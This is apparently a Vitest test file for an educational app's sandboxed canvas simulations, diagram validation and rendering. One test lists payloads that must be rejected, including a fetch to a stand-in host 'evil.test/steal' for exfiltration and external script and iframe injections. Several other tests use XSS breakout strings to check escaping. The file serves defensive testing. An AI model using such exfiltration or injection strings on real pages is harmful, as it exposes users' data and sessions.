import fs from "node:fs";
import path from "node:path";
import { runInNewContext } from "node:vm";
import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import {
  buildCanvasSimSrcDoc,
  buildStandaloneCanvasHtml,
  CANVAS_INNER_CSP,
  CANVAS_MAX_HEIGHT,
  CANVAS_MIN_HEIGHT,
  INITIAL_CANVAS_BRIDGE_STATE,
  reduceCanvasBridgeState,
  renderLatexInCanvasHtml,
  validateCanvasSim,
} from "../canvasSim";
import { detectCanvasVendors } from "../canvasVendors";
import {
  deriveSchematicFromLegacyItems,
  validateConceptDiagram,
} from "../conceptDiagram";
import { extractVisualExample, validateVisualExample } from "../visuals";
import {
  analyzeDiagramTopology,
  ConceptSchematicGraph,
  filterConceptDiagramByLayer,
} from "../../../components/learning/ConceptSchematicGraph";
import { buildMermaidConfig } from "../../../components/learning/MermaidDiagram";
import { VisualExample } from "../../../components/learning/VisualExample";
import { MarkdownView } from "../../../components/chat/MarkdownView";
import { CanvasSandbox } from "../../../components/learning/CanvasSandbox";

const waveCanvasVisual = {
  kind: "canvas" as const,
  title: "Wave Superposition Lab",
  summary:
    "Two sine waves add point-by-point; shifting phase from 0° to 180° moves from constructive to destructive interference.",
  canvas: {
    controlsHint: "Drag the phase offset slider from 0° to 180°.",
    height: 300,
    html: `<canvas id="wave" width="560" height="200"></canvas>
<div class="controls">
  <label>Phase <strong id="phaseOut">0°</strong>
    <input id="phase" type="range" min="0" max="180" value="0">
  </label>
</div>`,
    js: `const { ctx, width, height } = window.setupForgeCanvas("wave", 200);
const slider = document.getElementById("phase");
const out = document.getElementById("phaseOut");
function draw() {
  const deg = Number(slider.value);
  out.textContent = deg + "°";
  const rad = (deg * Math.PI) / 180;
  ctx.clearRect(0, 0, width, height);
  ctx.strokeStyle = window.FORGE_THEME.accent;
  ctx.lineWidth = 2;
  ctx.beginPath();
  for (let x = 0; x < width; x++) {
    const k = (x / width) * Math.PI * 4;
    const y = height / 2 - 36 * (Math.sin(k) + Math.sin(k + rad));
    if (x === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
  }
  ctx.stroke();
}
slider.addEventListener("input", draw);
draw();`,
  },
  items: [
    {
      id: "in-phase",
      label: "0° phase offset (constructive)",
      description: "Peaks align with peaks, doubling the combined amplitude.",
    },
    {
      id: "out-of-phase",
      label: "180° phase offset (destructive)",
      description:
        "Peaks align with troughs of equal size, cancelling to a flat line.",
    },
  ],
  takeaway:
    "Superposition adds displacements at every point: phase alignment governs whether waves reinforce or cancel.",
};

describe("sandboxed interactive canvas simulation contract", () => {
  it("validates structured kind='canvas' visuals and extracts forge-visual blocks", () => {
    const validated = validateVisualExample(waveCanvasVisual);
    expect(validated).not.toBeNull();
    expect(validated?.kind).toBe("canvas");
    expect(validated?.canvas?.height).toBe(300);
    expect(validated?.canvas?.controlsHint).toContain("phase offset");

    const extracted = extractVisualExample(
      `Try shifting the phase below.\n\`\`\`forge-visual\n${JSON.stringify(
        waveCanvasVisual
      )}\n\`\`\``
    );
    expect(extracted).toEqual(validated);
  });

  it("normalizes single-file full HTML documents passed in html or code", () => {
    const singleDoc = validateCanvasSim({
      code: `<!doctype html>
<html>
<head><style>.box { color: #cfb292; }</style></head>
<body>
  <canvas id="boids" width="500" height="240"></canvas>
  <button id="reset" type="button">Scatter</button>
  <script>
    const c = document.getElementById("boids");
    const ctx = c.getContext("2d");
    ctx.fillRect(10, 10, 40, 40);
  </script>
</body>
</html>`,
      height: 999,
    });
    expect(singleDoc).not.toBeNull();
    expect(singleDoc?.css).toContain(".box");
    expect(singleDoc?.html).toContain('<canvas id="boids"');
    expect(singleDoc?.html).not.toContain("<script>");
    expect(singleDoc?.js).toContain('getContext("2d")');
    expect(singleDoc?.height).toBe(640); // clamped to max 640
  });

  it("rejects external scripts, network exfiltration APIs, nested frames, and non-interactive markup", () => {
    const badPayloads = [
      // External CDN script tag
      {
        html: '<canvas id="c"></canvas><script src="https://cdn.evil.test/x.js"></script>',
        js: 'const ctx = document.getElementById("c").getContext("2d");',
      },
      // External stylesheet link
      {
        html: '<link rel="stylesheet" href="https://evil.test/a.css"><canvas id="c"></canvas>',
        js: 'const ctx = document.getElementById("c").getContext("2d");',
      },
      // Attempted CSP meta override
      {
        html: '<meta http-equiv="Content-Security-Policy" content="default-src *"><canvas id="c"></canvas>',
        js: 'const ctx = document.getElementById("c").getContext("2d");',
      },
      // Nested iframe
      {
        html: '<iframe src="https://evil.test"></iframe><canvas id="c"></canvas>',
        js: 'const ctx = document.getElementById("c").getContext("2d");',
      },
      // Outbound fetch exfiltration
      {
        html: '<canvas id="c"></canvas>',
        js: 'fetch("https://evil.test/steal?x=1");',
      },
      // Outbound WebSocket
      {
        html: '<canvas id="c"></canvas>',
        js: 'const ws = new WebSocket("wss://evil.test");',
      },
      // Outbound XMLHttpRequest
      {
        html: '<canvas id="c"></canvas>',
        js: 'const xhr = new XMLHttpRequest();',
      },
      // Plain static prose with no interactive or canvas surface
      {
        html: "<p>Just a static paragraph with nothing to manipulate.</p>",
        js: "const a = 1 + 2; console.log(a);",
      },
    ];

    for (const bad of badPayloads) {
      expect(validateCanvasSim(bad)).toBeNull();
    }
  });

  it("injects strict zero-network CSP first in srcDoc and escapes closing script/style breakouts", () => {
    const spec = validateCanvasSim({
      html: '<canvas id="c"></canvas>',
      css: ".note::after { content: '</style><script>evil()</script>'; }",
      js: 'const label = "</script><img src=x onerror=evil()>"; const ctx = document.getElementById("c").getContext("2d");',
    })!;
    expect(spec).not.toBeNull();

    const srcDoc = buildCanvasSimSrcDoc(spec, "tok-123");
    expect(srcDoc).toContain(CANVAS_INNER_CSP);
    expect(srcDoc).toContain("connect-src 'none'");
    expect(srcDoc).toContain("default-src 'none'");
    // CSP meta must appear before any <script> tag
    expect(srcDoc.indexOf("Content-Security-Policy")).toBeLessThan(
      srcDoc.indexOf("<script>")
    );
    // Closing tag breakouts inside CSS/JS must be escaped
    expect(srcDoc).toContain("<\\/style>");
    expect(srcDoc).toContain("<\\/script>");
    expect(srcDoc).toContain("window.setupForgeCanvas");
    expect(srcDoc).toContain('"tok-123"');
  });

  it("authenticates postMessage tokens and clamps resize heights in reduceCanvasBridgeState", () => {
    const token = "lf-valid-1";
    // Wrong token or wrong source is ignored completely
    expect(
      reduceCanvasBridgeState(
        INITIAL_CANVAS_BRIDGE_STATE,
        { source: "learnforge-canvas", token: "wrong", type: "error", message: "fake" },
        token
      )
    ).toBe(INITIAL_CANVAS_BRIDGE_STATE);

    expect(
      reduceCanvasBridgeState(
        INITIAL_CANVAS_BRIDGE_STATE,
        { source: "other", token, type: "interact" },
        token
      )
    ).toBe(INITIAL_CANVAS_BRIDGE_STATE);

    // Valid resize clamps low & high values
    const low = reduceCanvasBridgeState(
      INITIAL_CANVAS_BRIDGE_STATE,
      { source: "learnforge-canvas", token, type: "resize", height: 40 },
      token
    );
    expect(low.height).toBe(CANVAS_MIN_HEIGHT);

    const high = reduceCanvasBridgeState(
      low,
      { source: "learnforge-canvas", token, type: "resize", height: 4000 },
      token
    );
    expect(high.height).toBe(CANVAS_MAX_HEIGHT);
    expect(high.heightLimited).toBe(true);

    // Valid interact + error transitions
    const interacted = reduceCanvasBridgeState(
      high,
      { source: "learnforge-canvas", token, type: "interact" },
      token
    );
    expect(interacted.interacted).toBe(true);

    const errored = reduceCanvasBridgeState(
      interacted,
      {
        source: "learnforge-canvas",
        token,
        type: "error",
        message: "ReferenceError: boidVelocity is not defined",
      },
      token
    );
    expect(errored.error).toBe("ReferenceError: boidVelocity is not defined");
  });

  it("fits tall ordinary figures and shrinks after a state change without keeping a scroll trap", () => {
    const resize = (state: typeof INITIAL_CANVAS_BRIDGE_STATE, height: number, token = "current") =>
      reduceCanvasBridgeState(state, { source: "learnforge-canvas", token, type: "resize", height }, "current");
    const tall = resize(INITIAL_CANVAS_BRIDGE_STATE, 760);
    expect(tall.height).toBe(760);
    expect(tall.heightLimited).toBe(false);
    expect(resize(tall, 260)).toMatchObject({ height: 260, heightLimited: false });
    expect(resize(tall, 999, "previous-run")).toBe(tall);
    const limited = resize(tall, 4000);
    expect(limited).toMatchObject({ height: CANVAS_MAX_HEIGHT, heightLimited: true });
    expect(resize(limited, CANVAS_MAX_HEIGHT)).toMatchObject({ height: CANVAS_MAX_HEIGHT, heightLimited: false });
    for (const invalid of [Number.NaN, Number.POSITIVE_INFINITY, -1, 0]) {
      expect(resize(tall, invalid)).toBe(tall);
    }
  });

  it("measures actual content rather than preserving the old iframe viewport height", () => {
    let contentHeight = 760;
    const sent: Array<{ type: string; height?: number }> = [];
    const root = {
      get scrollHeight() { return contentHeight; },
      getBoundingClientRect: () => ({ height: contentHeight }),
    };
    const sandboxWindow: Record<string, any> = { addEventListener() {}, matchMedia: () => ({ matches: false }) };
    const source = buildCanvasSimSrcDoc(waveCanvasVisual.canvas, "fit-test");
    const bootstrap = /<script>([\s\S]*?)<\/script>/.exec(source)![1];
    runInNewContext(bootstrap, {
      window: sandboxWindow,
      parent: { postMessage: (message: any) => sent.push(message) },
      document: { getElementById: () => root, addEventListener() {} },
    });
    sandboxWindow.__forgeReportHeight();
    contentHeight = 254;
    sandboxWindow.__forgeReportHeight();
    expect(sent).toMatchObject([
      { type: "resize", height: 762 },
      { type: "resize", height: 256 },
    ]);
  });

  it("keeps authored canvas coordinates visible on narrow screens without inflating repeated setup", () => {
    const attrs = new Map([['width', '580'], ['height', '240']]);
    const ctx = { setTransform() {} };
    const canvas: Record<string, any> = {
      style: {}, clientWidth: 320,
      getBoundingClientRect: () => ({ width: 320 }),
      getAttribute: (name: string) => attrs.get(name) ?? null,
      setAttribute: (name: string, value: string) => attrs.set(name, value),
      getContext: () => ctx,
    };
    const sandboxWindow: Record<string, any> = { devicePixelRatio: 2, addEventListener() {}, matchMedia: () => ({ matches: false }) };
    const bootstrap = /<script>([\s\S]*?)<\/script>/.exec(buildCanvasSimSrcDoc(waveCanvasVisual.canvas, "scale-test"))![1];
    runInNewContext(bootstrap, {
      window: sandboxWindow,
      document: { getElementById: () => canvas, addEventListener() {} },
    });
    const first = sandboxWindow.setupForgeCanvas("stage", 240);
    expect(first.width).toBe(580);
    expect(canvas.style.height).toBe("auto");
    expect(canvas.style.aspectRatio).toBe("580 / 240");
    expect(canvas.width).toBe(1160);
    const next = sandboxWindow.setupForgeCanvas("stage", 240);
    expect(next.width).toBe(580);
    expect(canvas.style.height).toBe("auto");
    expect(canvas.style.aspectRatio).toBe("580 / 240");
    // A later host resize preserves aspect without re-running model setup.
    canvas.getBoundingClientRect = () => ({ width: 820 });
    expect(canvas.style.aspectRatio).toBe("580 / 240");
    expect(sandboxWindow.setupForgeCanvas("stage", 240).width).toBe(820);
  });

  it("initializes embedded figures once after host layout settles while exports still start immediately", () => {
    let layoutWidth = 580;
    const frames: Array<() => void> = [];
    const spec = {
      html: '<canvas id="stage" width="580" height="240"></canvas>',
      js: 'const viewport = window.setupForgeCanvas("stage", 240); window.initializations = (window.initializations || 0) + 1; window.measuredWidth = viewport.width;',
    };
    const lastScript = (html: string) => { const scripts = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)]; return scripts[scripts.length - 1][1]; };
    const sandboxWindow: Record<string, any> = { dispatchEvent() {}, setupForgeCanvas: () => ({ width: layoutWidth }) };
    const environment = {
      window: sandboxWindow,
      document: { getElementById: () => ({ getBoundingClientRect: () => ({ width: layoutWidth }) }) },
      requestAnimationFrame: (callback: () => void) => frames.push(callback),
      Event: class {},
    };
    runInNewContext(lastScript(buildCanvasSimSrcDoc(spec, "layout-test")), environment);
    expect(sandboxWindow.initializations).toBeUndefined();
    layoutWidth = 874;
    frames.shift()!();
    expect(sandboxWindow.initializations).toBe(1);
    expect(sandboxWindow.measuredWidth).toBe(874);
    frames.splice(0).forEach((callback) => callback());
    expect(sandboxWindow.initializations).toBe(1);

    const exportWindow: Record<string, any> = { setupForgeCanvas: () => ({ width: layoutWidth }) };
    runInNewContext(lastScript(buildStandaloneCanvasHtml("Saved model", spec)), { ...environment, window: exportWindow });
    expect(exportWindow.initializations).toBe(1);
    expect(exportWindow.measuredWidth).toBe(874);
  });

  it("keeps saved load and DOM-ready handlers registered before their event fires", () => {
    const lastScript = (html: string) => { const scripts = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)]; return scripts[scripts.length - 1][1]; };
    for (const registration of [
      'document.addEventListener("DOMContentLoaded", initialize);',
      'window.addEventListener("load", initialize);',
      'window.onload = initialize;',
    ]) {
      const events = new Map<string, () => void>();
      const sandboxWindow: Record<string, any> = {
        dispatchEvent() {},
        setupForgeCanvas: () => ({ width: 874 }),
        addEventListener: (name: string, callback: () => void) => events.set(name, callback),
      };
      const spec = {
        html: '<canvas id="stage" width="580" height="240"></canvas>',
        js: 'function initialize() { window.setupForgeCanvas("stage", 240); window.initializations = (window.initializations || 0) + 1; } ' + registration,
      };
      runInNewContext(lastScript(buildCanvasSimSrcDoc(spec, "ready-test")), {
        window: sandboxWindow,
        document: { addEventListener: (name: string, callback: () => void) => events.set(name, callback) },
        requestAnimationFrame() {},
      });
      // No animation-frame callback has run, but the listener is already ready.
      const ready = events.get("DOMContentLoaded") || events.get("load") || sandboxWindow.onload;
      expect(ready).toBeTypeOf("function");
      expect(sandboxWindow.initializations).toBeUndefined();
      ready();
      expect(sandboxWindow.initializations).toBe(1);
    }
  });

  it("renders a full-height ordinary frame with secondary tools instead of a compact clipping control", () => {
    const markup = renderToStaticMarkup(<CanvasSandbox spec={{ ...waveCanvasVisual.canvas, height: 640 }} title="Wave model" />);
    expect(markup).toContain('height:640px');
    expect(markup).toContain('scrolling="no"');
    expect(markup).toContain('aria-label="More visual options"');
    expect(markup).toContain('Restart model');
    expect(markup).not.toContain('Interactive Studio');
    expect(markup).not.toContain('Show full simulation');
  });

  it("renders zero-origin sandbox='allow-scripts' iframe (never allow-same-origin) with escaped text equivalent", () => {
    const validated = validateVisualExample({
      ...waveCanvasVisual,
      title: "Wave Lab <img src=x onerror=attack()>",
    })!;
    const markup = renderToStaticMarkup(
      <VisualExample visual={validated} visualId="wave-1" />
    );

    expect(markup).toContain('sandbox="allow-scripts"');
    expect(markup).not.toContain("allow-same-origin");
    expect(markup).toContain('referrerPolicy="no-referrer"');
    // Title XSS attempt is escaped in parent DOM
    expect(markup).toContain("&lt;img src=x onerror=attack()&gt;");
    expect(markup).not.toContain("<img src=x");
    // Guaranteed text equivalent remains present
    expect(markup).toContain("How it works");
    expect(markup).toContain("180° phase offset (destructive)");
    expect(markup).toContain("as standalone HTML");
  });

  it("renders inline ```forge-canvas blocks in MarkdownView and hides incomplete streaming JSON gracefully", () => {
    const inlineBlock = [
      "Explore how phase governs interference:",
      "```forge-canvas",
      JSON.stringify({
        title: waveCanvasVisual.title,
        summary: waveCanvasVisual.summary,
        takeaway: waveCanvasVisual.takeaway,
        ...waveCanvasVisual.canvas,
      }),
      "```",
    ].join("\n");

    const rendered = renderToStaticMarkup(<MarkdownView content={inlineBlock} />);
    expect(rendered).toContain('sandbox="allow-scripts"');
    expect(rendered).not.toContain("allow-same-origin");
    expect(rendered).toContain("Wave Superposition Lab");

    // Incomplete mid-stream block shows calm status instead of dumping raw JS
    const streaming = "```forge-canvas\n{\"title\":\"Boids\",\"html\":\"<canvas";
    const pendingHtml = renderToStaticMarkup(<MarkdownView content={streaming} />);
    expect(pendingHtml).toContain("Preparing interactive simulation");
    expect(pendingHtml).not.toContain("<canvas");
  });

  it("builds standalone offline HTML export with escaped metadata and null bridge token", () => {
    const validated = validateVisualExample(waveCanvasVisual)!;
    const exported = buildStandaloneCanvasHtml(
      'Wave <script>alert("x")</script>',
      validated.canvas!,
      { summary: validated.summary, takeaway: validated.takeaway }
    );
    expect(exported).toContain(CANVAS_INNER_CSP);
    expect(exported).toContain("var TOKEN = null;");
    expect(exported).toContain("&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt;");
    expect(exported).toContain("window.__forgeReportError");
    expect(exported).not.toContain('"use strict";');
  });

  it("typesets inline and display KaTeX inside canvas HTML without corrupting attributes or scripts", () => {
    const html = renderLatexInCanvasHtml(
      '<div class="formula-bar" data-price="$10">Loss: $L(w) = \\alpha w^2$</div><script>const x = "$notMath$";</script>'
    );
    expect(html).toContain("katex");
    expect(html).toContain('data-price="$10"');
    expect(html).toContain('const x = "$notMath$";');
  });

  it("detects offline 3D Three.js, D3, Rough.js, and dynamic KaTeX vendor usage", () => {
    expect(
      detectCanvasVendors(
        'const { THREE, scene } = window.setupForge3D("stage", 260);'
      )
    ).toEqual({ katex: false, rough: false, d3: false, three: true, any: true });

    expect(
      detectCanvasVendors(
        'd3.select("svg"); rough.canvas(c); katex.render("x^2", el);'
      )
    ).toEqual({ katex: true, rough: true, d3: true, three: false, any: true });
  });

  it("validates kind='diagram' schematics and automatically upgrades legacy code 'parts' into syntax-highlighted blueprints", () => {
    const diagramVisual = validateVisualExample({
      kind: "diagram",
      title: "Interface Contract vs Concrete Type",
      summary:
        "A concrete type satisfies `$\\text{Scorer}$` implicitly when its method set includes `Score() int`.",
      diagram: {
        direction: "LR",
        nodes: [
          {
            id: "contract",
            badge: "INTERFACE CONTRACT",
            label: "Scorer",
            formula: "\\tau \\models \\text{Scorer}",
            code: "type Scorer interface { Score() int }",
            detail: "Specifies required method signature `Score() int`.",
            tone: "accent",
          },
          {
            id: "guard",
            badge: "CONCRETE STRUCT",
            label: "Guard",
            code: "type Guard struct { Points int }",
            detail: "Provides field storage `Points int`.",
            tone: "blue",
          },
        ],
        edges: [{ from: "guard", to: "contract", label: "satisfies" }],
      },
      items: [
        {
          id: "i1",
          label: "Contract role",
          description: "Method set requirement `$\\operatorname{sig}(I)$`.",
        },
        {
          id: "i2",
          label: "Concrete struct",
          description: "Implements `Score() int` without `implements` keyword.",
        },
      ],
      takeaway: "Satisfaction is structural: `$\\text{Guard} \\models \\text{Scorer}$`.",
    });

    expect(diagramVisual).not.toBeNull();
    expect(validateConceptDiagram(diagramVisual?.diagram)).not.toBeNull();

    const html = renderToStaticMarkup(
      <VisualExample
        visual={diagramVisual!}
        visualId="diag-1"
        embedded
        language="go"
      />
    );
    expect(html).toContain("katex");
    expect(html).toContain("visual-code-chip");
    // Embedded mode omits the duplicate outer disclosure header
    expect(html).not.toContain("visual-disclosure");

    // Legacy 3-item Go interface "parts" automatically upgrades to CONTRACT / CONCRETE TYPE / IMPLEMENTATION edges
    const upgraded = deriveSchematicFromLegacyItems("parts", [
      {
        id: "p1",
        label: "type Scorer interface { Score() int }",
        description: "The contract.",
      },
      {
        id: "p2",
        label: "type Guard struct { Points int }",
        description: "The struct.",
      },
      {
        id: "p3",
        label: "func (g Guard) Score() int { return g.Points }",
        description: "The method.",
      },
    ]);
    expect(upgraded.direction).toBe("LR");
    expect(upgraded.nodes[0].formula).toBeUndefined();
    expect(upgraded.nodes.map((n) => n.badge)).toEqual([
      "CONTRACT",
      "CONCRETE TYPE",
      "IMPLEMENTATION",
    ]);
    expect(upgraded.edges.map((e) => e.label)).toEqual([
      "defines method",
      "satisfies",
    ]);

    // Out-of-order 4-node Go diagram topologically sorts into 01 -> 02 -> 03 -> 04 serpentine chain
    const fourNodeSpec = validateConceptDiagram({
      direction: "LR",
      nodes: [
        { id: "contract", label: "Shooter Role", badge: "INTERFACE CONTRACT", detail: "Contract" },
        { id: "guard", label: "Guard Value", badge: "CONCRETE TYPE", detail: "Struct" },
        { id: "method", label: "Value Receiver", badge: "METHOD SET", detail: "Receiver" },
        { id: "assign", label: "Implicit Binding", badge: "INTERFACE ASSIGNMENT", detail: "Assign" },
      ],
      edges: [
        { from: "guard", to: "method", label: "binds receiver" },
        { from: "method", to: "contract", label: "matches signature" },
        { from: "contract", to: "assign", label: "validates T |= I" },
      ],
    })!;
    const topo = analyzeDiagramTopology(fourNodeSpec);
    expect(topo.isChain).toBe(true);
    expect(topo.orderedNodes.map((n) => n.id)).toEqual([
      "guard",
      "method",
      "contract",
      "assign",
    ]);
  });

  it("prevents Tauri CSP sha256 asset-hash injection from blocking srcDoc simulation scripts in WKWebView", () => {
    const tauriConfPath = path.resolve(
      __dirname,
      "../../../../src-tauri/tauri.conf.json"
    );
    const tauriConf = JSON.parse(fs.readFileSync(tauriConfPath, "utf8"));
    const disabled =
      tauriConf?.app?.security?.dangerousDisableAssetCspModification;
    expect(
      disabled === true ||
        (Array.isArray(disabled) && disabled.includes("script-src"))
    ).toBe(true);
  });

  it("recovers loose LLM forge-visual JSON with raw newlines, top-level canvas fields, or missing item ids", () => {
    const looseMessage = [
      "Here is a live memory simulation:",
      "```forge-visual",
      `{"title":"Loop Capture Lab","summary":"Observe shared vs copied worker slots.","html":"<canvas id=\\"stage\\" width=\\"580\\" height=\\"200\\"></canvas><button id=\\"step\\">Step</button>","js":"const { ctx, width, height } = window.setupForgeCanvas('stage', 200);
ctx.fillRect(0, 0, width, height);","items":[{"label":"Shared slot","description":"All workers read one variable."}]}`,
      "```",
    ].join("\n");

    const parsed = extractVisualExample(looseMessage);
    expect(parsed).not.toBeNull();
    expect(parsed?.kind).toBe("canvas");
    expect(parsed?.canvas?.js).toContain("setupForgeCanvas");
    expect(parsed?.items.length).toBeGreaterThanOrEqual(2);
  });

  it("validates layered architecture diagrams with groups, semantic shapes, and 12-node / 24-edge bounds", () => {
    const goWorkspaceSpec = validateConceptDiagram({
      direction: "LR",
      groups: [
        { id: "edge", label: "API Module (api/)", tone: "accent" },
        { id: "core", label: "Domain Module (domain/)", tone: "blue" },
        { id: "async", label: "Worker Module (worker/)", tone: "coral" },
        { id: "data", label: "Persistence (store/)", tone: "teal" },
        // Duplicate group id should be ignored cleanly
        { id: "edge", label: "Duplicate Edge" },
      ],
      layers: [
        {
          label: "Happy Path",
          summary: "Client sends an HTTP request through the API handlers into domain logic.",
        },
        {
          label: "Persistence",
          summary: "Domain repository contracts resolve against the SQL store.",
        },
        {
          label: "Async Workers",
          summary: "Outbox events fan out through a job queue to background workers.",
        },
      ],
      nodes: [
        {
          id: "client",
          label: "Browser Client",
          badge: "CALLER",
          detail: "Issues JSON requests over HTTPS.",
          tone: "neutral",
          shape: "client",
          layer: 1,
        },
        {
          id: "handlers",
          label: "HTTP Handlers",
          badge: "SERVICE",
          detail: "Parses requests and delegates to domain services.",
          tone: "accent",
          shape: "service",
          group: "edge",
          layer: 1,
        },
        {
          id: "domain",
          label: "Order Domain",
          badge: "MODULE",
          detail: "Pure business rules shared across go.work modules.",
          tone: "blue",
          shape: "module",
          group: "core",
          layer: 1,
        },
        {
          id: "repo",
          label: "OrderStore",
          badge: "INTERFACE",
          detail: "Minimal persistence contract owned by domain.",
          tone: "blue",
          shape: "interface",
          group: "core",
          layer: 2,
        },
        {
          id: "store",
          label: "Postgres Store",
          badge: "DATABASE",
          detail: "Implements OrderStore with transactional writes.",
          tone: "teal",
          shape: "database",
          group: "data",
          layer: 2,
        },
        {
          id: "queue",
          label: "Job Queue",
          badge: "QUEUE",
          detail: "Buffers fulfillment jobs between API and worker.",
          tone: "accent",
          shape: "queue",
          group: "async",
          layer: 3,
        },
        {
          id: "worker",
          label: "Fulfillment Worker",
          badge: "WORKER",
          detail: "Consumes queued jobs with idempotent retries.",
          tone: "coral",
          shape: "worker",
          group: "async",
          layer: 3,
        },
      ],
      edges: [
        { from: "client", to: "handlers", label: "POST /orders", layer: 1 },
        { from: "handlers", to: "domain", label: "CreateOrder()", layer: 1 },
        { from: "domain", to: "repo", label: "depends on", layer: 2 },
        { from: "store", to: "repo", label: "implements", layer: 2 },
        { from: "domain", to: "queue", label: "enqueue", layer: 3 },
        { from: "queue", to: "worker", label: "dispatch", layer: 3 },
      ],
    });

    expect(goWorkspaceSpec).not.toBeNull();
    expect(goWorkspaceSpec?.groups).toHaveLength(4);
    expect(goWorkspaceSpec?.layers).toHaveLength(3);
    expect(goWorkspaceSpec?.nodes.find((n) => n.id === "store")?.shape).toBe("database");
    expect(goWorkspaceSpec?.nodes.find((n) => n.id === "worker")?.group).toBe("async");
    expect(goWorkspaceSpec?.edges.find((e) => e.from === "queue")?.layer).toBe(3);

    // Invalid shape, undeclared group, and out-of-range layers are sanitized cleanly
    const sanitized = validateConceptDiagram({
      direction: "TB",
      groups: [{ id: "g1", label: "Valid Group", tone: "teal" }],
      layers: [{ label: "Only One Layer" }],
      nodes: [
        {
          id: "a",
          label: "Node A",
          detail: "First node",
          shape: "not-a-shape",
          group: "missing-group",
          layer: 2,
        },
        {
          id: "b",
          label: "Node B",
          detail: "Second node",
          shape: "module",
          group: "g1",
          layer: 1,
        },
      ],
      edges: [{ from: "a", to: "b", layer: 99 }],
    });
    expect(sanitized).not.toBeNull();
    expect(sanitized?.layers).toBeUndefined();
    expect(sanitized?.nodes[0].shape).toBeUndefined();
    expect(sanitized?.nodes[0].group).toBeUndefined();
    expect(sanitized?.nodes[0].layer).toBeUndefined();
    expect(sanitized?.nodes[1].shape).toBe("module");
    expect(sanitized?.nodes[1].group).toBe("g1");
    expect(sanitized?.edges[0].layer).toBeUndefined();

    // 12 nodes and 24 edges are accepted; 13 nodes or 25 edges are rejected
    const twelveNodes = Array.from({ length: 12 }, (_, i) => ({
      id: `n${i}`,
      label: `Node ${i}`,
      detail: `Detail ${i}`,
    }));
    const twentyFourEdges = Array.from({ length: 24 }, (_, i) => ({
      from: `n${i % 11}`,
      to: `n${(i % 11) + 1}`,
    }));
    expect(
      validateConceptDiagram({ direction: "LR", nodes: twelveNodes, edges: twentyFourEdges })
    ).not.toBeNull();
    expect(
      validateConceptDiagram({
        direction: "LR",
        nodes: [...twelveNodes, { id: "n12", label: "Extra", detail: "Too many" }],
        edges: [],
      })
    ).toBeNull();
    expect(
      validateConceptDiagram({
        direction: "LR",
        nodes: twelveNodes,
        edges: [...twentyFourEdges, { from: "n0", to: "n2" }],
      })
    ).toBeNull();
  });

  it("renders grouped containers, semantic shape classes, and progressive layer disclosure in ConceptSchematicGraph", () => {
    const layeredSpec = validateConceptDiagram({
      direction: "LR",
      groups: [
        { id: "api", label: "API Boundary", tone: "accent" },
        { id: "data", label: "Storage Layer", tone: "teal" },
        { id: "bg", label: "Background Jobs", tone: "coral" },
      ],
      layers: [
        { label: "Request Path", summary: "Client enters through the API service." },
        { label: "Data Store", summary: "API writes records to Postgres." },
        { label: "Async Queue", summary: "Background worker drains queued tasks." },
      ],
      nodes: [
        {
          id: "client",
          label: "Web Client",
          badge: "CLIENT",
          detail: "Originates requests.",
          shape: "client",
          layer: 1,
        },
        {
          id: "api-svc",
          label: "API Server",
          badge: "SERVICE",
          detail: "Validates payloads and routes calls.",
          tone: "accent",
          shape: "service",
          group: "api",
          layer: 1,
        },
        {
          id: "pg",
          label: "Postgres DB",
          badge: "STORE",
          detail: "Durable relational store.",
          tone: "teal",
          shape: "database",
          group: "data",
          layer: 2,
        },
        {
          id: "jobs",
          label: "Work Queue",
          badge: "QUEUE",
          detail: "Buffered task channel.",
          tone: "accent",
          shape: "queue",
          group: "bg",
          layer: 3,
        },
        {
          id: "worker",
          label: "Job Worker",
          badge: "WORKER",
          detail: "Processes queued jobs asynchronously.",
          tone: "coral",
          shape: "worker",
          group: "bg",
          layer: 3,
        },
      ],
      edges: [
        { from: "client", to: "api-svc", label: "HTTP", layer: 1 },
        { from: "api-svc", to: "pg", label: "INSERT", layer: 2 },
        { from: "api-svc", to: "jobs", label: "publish", layer: 3 },
        { from: "jobs", to: "worker", label: "consume", layer: 3 },
      ],
    })!;

    // Default render starts on Layer 1: clean happy path only
    const layer1Html = renderToStaticMarkup(
      <ConceptSchematicGraph
        spec={layeredSpec}
        selectedIndex={4}
        onSelectIndex={() => {}}
      />
    );
    expect(layer1Html).toContain("schematic-layer-bar");
    expect(layer1Html).toContain("schematic-layer-pill");
    expect(layer1Html).toContain("Show all");
    expect(layer1Html).toContain("Client enters through the API service.");
    expect(layer1Html).toContain("2 of 5 components");
    expect(layer1Html).toContain("schematic-group-box tone-accent");
    expect(layer1Html).toContain("API Boundary");
    expect(layer1Html).toContain("shape-client");
    expect(layer1Html).toContain("shape-service");
    expect(layer1Html).toContain("schematic-shape-glyph");
    // Layer 2 and 3 nodes/groups stay hidden at Layer 1
    expect(layer1Html).not.toContain("Postgres DB");
    expect(layer1Html).not.toContain("Storage Layer");
    expect(layer1Html).not.toContain("Job Worker");

    // Progressive layer helper filters nodes and edges cleanly
    const l2Spec = filterConceptDiagramByLayer(layeredSpec, 2);
    expect(l2Spec.nodes.map((n) => n.id)).toEqual(["client", "api-svc", "pg"]);
    expect(l2Spec.edges.map((e) => e.to)).toEqual(["api-svc", "pg"]);

    // Full layer reveal shows all groups and semantic shapes
    const layer3Html = renderToStaticMarkup(
      <ConceptSchematicGraph
        spec={layeredSpec}
        selectedIndex={0}
        onSelectIndex={() => {}}
        initialLayer={3}
      />
    );
    expect(layer3Html).toContain("5 of 5 components");
    expect(layer3Html).toContain("schematic-group-box tone-teal");
    expect(layer3Html).toContain("schematic-group-box tone-coral");
    expect(layer3Html).toContain("shape-database");
    expect(layer3Html).toContain("shape-queue");
    expect(layer3Html).toContain("shape-worker");
    expect(layer3Html).toContain("Postgres DB");
    expect(layer3Html).toContain("Job Worker");
  });

  it("builds Mermaid 12 dark/light-paper, sketch/classic, and ELK/dagre configurations cleanly", () => {
    const darkClassicElk = buildMermaidConfig("dark", false, true);
    expect(darkClassicElk.look).toBe("classic");
    expect(darkClassicElk.layout).toBe("elk");
    expect(darkClassicElk.themeVariables?.darkMode).toBe(true);
    expect(darkClassicElk.themeVariables?.background).toBe("#0e1217");

    const lightSketchFallback = buildMermaidConfig("light", true, false);
    expect(lightSketchFallback.look).toBe("handDrawn");
    expect(lightSketchFallback.layout).toBe("dagre");
